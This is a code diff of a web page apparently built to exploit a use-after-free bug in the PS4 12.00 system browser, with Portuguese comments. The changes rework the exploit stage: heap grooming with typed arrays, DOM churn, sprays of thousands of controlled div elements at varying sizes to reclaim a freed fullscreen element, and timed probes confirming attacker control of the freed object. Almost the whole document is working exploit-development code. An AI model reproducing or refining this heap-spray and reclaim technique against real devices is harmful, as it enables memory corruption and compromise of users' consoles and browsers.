@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Precise Reclaim</title>
+<title>PS4 12.00 - UAF Conversion Stage</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Precise Reclaim (Aligned)</h2>
+<h2>PS4 12.00 - UAF Conversion (Visual → JS)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -15,7 +15,6 @@
 // 🔒 LOG SEGURO
 // ==========================
 let logBuffer = [];
-
 function log(msg) {
     try { console.log(msg); } catch(e){}
     logBuffer.push(msg);
@@ -26,13 +25,11 @@ function log(msg) {
 // ==========================
 function setupHeap() {
     let controllers = [];
-
     for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
         controllers.push(arr);
     }
-
     return controllers;
 }
 
@@ -63,29 +60,29 @@ function setupFullscreen() {
 }
 
 // ==========================
-// 💣 PRECISE MONOTYPE RECLAIM
+// 💣 RECLAIM DINÂMICO
 // ==========================
-function preciseReclaim() {
-    log("[*] Precise reclaim iniciado");
+function preciseReclaim(size) {
+    log("[*] Reclaim size = " + size);
 
     let bucket = [];
 
-    // 🔹 Fase 1 — churn controlado
+    // churn inicial
     for (let i = 0; i < 3000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    // 🔹 Fase 2 — REUSE DIRECIONADO (estrutura idêntica)
-    for (let i = 0; i < 8000; i++) {
+    // spray controlado
+    for (let i = 0; i < size; i++) {
         let el = document.createElement("div");
 
         el.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>CONTROL_" + i + "<br>Press OPTIONS</h1>";
 
         el.style.background = "black";
-        el.style.width = "1%";
-        el.style.height = "1%";
+        el.style.width = "100%";
+        el.style.height = "100%";
         el.style.position = "absolute";
         el.style.top = "0";
         el.style.left = "0";
@@ -94,40 +91,60 @@ function preciseReclaim() {
         bucket.push(el);
     }
 
-    // 🔹 Fase 3 — churn final leve
+    // churn final
     for (let i = 0; i < 2000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    log("[*] Precise reclaim finalizado: " + bucket.length);
     return bucket;
 }
 
 // ==========================
-// 🔬 DETECÇÃO
+// 🔬 PROBES AVANÇADOS
 // ==========================
-function checkUAF(fsTarget) {
-    log("---- CHECK UAF ----");
+function probe(fsTarget) {
+    log("---- PROBE ----");
 
     try {
         let html = fsTarget.innerHTML;
         log("[CHECK] innerHTML = " + html);
 
         if (html && html.includes("CONTROL_")) {
-            log("[!!!] UAF CONTROLADO (MATCH PERFEITO)");
+            log("[!!!] CONTROLE VIA JS CONFIRMADO");
         }
 
     } catch(e) {
-        log("[UAF] innerHTML erro");
+        log("[UAF] innerHTML crash");
     }
 
     try {
-        let node = fsTarget.firstChild;
-        log("[CHECK] firstChild = " + node);
+        let rect = fsTarget.getBoundingClientRect();
+        log("[CHECK] rect ok");
     } catch(e) {
-        log("[UAF] firstChild erro");
+        log("[UAF] rect crash");
+    }
+
+    try {
+        fsTarget.style.background = "red";
+        log("[CHECK] style write OK");
+    } catch(e) {
+        log("[UAF] style write crash");
+    }
+
+    try {
+        let h = fsTarget.offsetHeight;
+        log("[CHECK] layout flush OK: " + h);
+    } catch(e) {
+        log("[UAF] layout crash");
+    }
+
+    try {
+        let p = fsTarget.parentNode;
+        log("[CHECK] parent = " + p);
+    } catch(e) {
+        log("[UAF] parent crash");
     }
 }
 
@@ -148,25 +165,25 @@ function trigger(fsTarget) {
         log("[ERRO]");
     }
 
-    // 🔥 janelas críticas (mantidas + ajuste fino)
-    setTimeout(() => preciseReclaim(), 0);
-    setTimeout(() => preciseReclaim(), 50);
-    setTimeout(() => preciseReclaim(), 100);
-    setTimeout(() => preciseReclaim(), 150); // 🔥 NOVO
+    // 🔥 TESTE DE TAMANHOS
+    let sizes = [6000, 8000, 10000];
 
-    // 🔬 checks
-    setTimeout(() => checkUAF(fsTarget), 10);
-    setTimeout(() => checkUAF(fsTarget), 30);
-    setTimeout(() => checkUAF(fsTarget), 60);
-    setTimeout(() => checkUAF(fsTarget), 120);
-    setTimeout(() => checkUAF(fsTarget), 250);
+    sizes.forEach((size, idx) => {
+        setTimeout(() => preciseReclaim(size), idx * 50);
+    });
 
-    // 🔒 dump seguro
+    // probes repetidos
+    setTimeout(() => probe(fsTarget), 10);
+    setTimeout(() => probe(fsTarget), 50);
+    setTimeout(() => probe(fsTarget), 100);
+    setTimeout(() => probe(fsTarget), 180);
+    setTimeout(() => probe(fsTarget), 260);
+
+    // dump seguro
     setTimeout(() => {
         alert(logBuffer.join("\n"));
     }, 400);
 
-    // 🔁 comportamento original
     setTimeout(() => location.reload(), 500);
 }
 
@@ -182,7 +199,6 @@ function runTest() {
     window.onblur = function() {
         log("[*] onblur");
 
-        // ⚠️ timing crítico intacto
         setTimeout(() => trigger(fsTarget), 3000);
     };
 }
